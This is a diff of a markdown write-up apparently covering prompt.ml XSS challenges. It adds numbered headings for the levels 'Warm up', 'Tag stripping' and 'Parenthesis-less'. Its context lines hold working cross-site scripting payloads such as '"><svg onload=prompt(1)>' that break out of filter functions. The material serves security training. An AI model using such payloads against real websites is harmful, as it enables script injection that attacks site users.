@@ -1,7 +1,9 @@
 # prompt.ml
 
-- Task
+1. Warm up
 
+- Task
+ 
 ```js
 function escape(input) {
     // warm up
@@ -15,6 +17,8 @@ function escape(input) {
 ```js
 "><svg onload=prompt(1)> <!--
 ```
+
+2. Tag stripping
 
 - Task
 
@@ -34,6 +38,8 @@ function escape(input) {
 ```js
 <svg onload=prompt(1) // 
 ```
+
+3. Parenthesis-less
 
 - Task
 
